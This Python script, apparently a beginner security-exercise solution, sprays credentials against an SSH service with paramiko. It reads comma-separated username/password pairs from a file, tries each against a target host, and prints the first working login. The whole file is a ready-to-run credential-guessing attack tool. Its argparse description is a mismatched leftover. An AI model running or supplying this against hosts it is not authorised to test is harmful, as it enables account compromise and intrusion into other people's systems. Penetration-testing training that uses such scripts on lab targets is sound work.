#!/usr/bin/env python

# Beginner Task: Write a script that will perform a password spray
# against the SSH service using a single username and password list. 
# It should output each time a username/password combination is failed,
# and stop on a successful log in.

import argparse
import getpass
import paramiko
import sys

def ssh_login(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"Attempting {user}:{passwd}")
    try:
    	client.connect(ip, port=port, username=user, password=passwd)
    	return True
    except:
    	return False


if __name__ == '__main__':

	parser = argparse.ArgumentParser(description='Search for a provided list of queries.')
	parser.add_argument('-t', '--target', default=False, help='Target hostname or IP')
	parser.add_argument('-p', '--port', default=False, help='SSH port')
	parser.add_argument('-i', '--input', default=False, help='Load comma-separated credentials from file')
	args = parser.parse_args()

	ip = args.target
	port = args.port

	with open(args.input, "r") as creds_file:
		credentials = creds_file.readlines()
		for credential in credentials:
			user, password = credential.split(",")
			if ssh_login(ip, port, user, password.rstrip()):
				print(f"Successful login as {user}:{password.rstrip()}.")
				sys.exit()
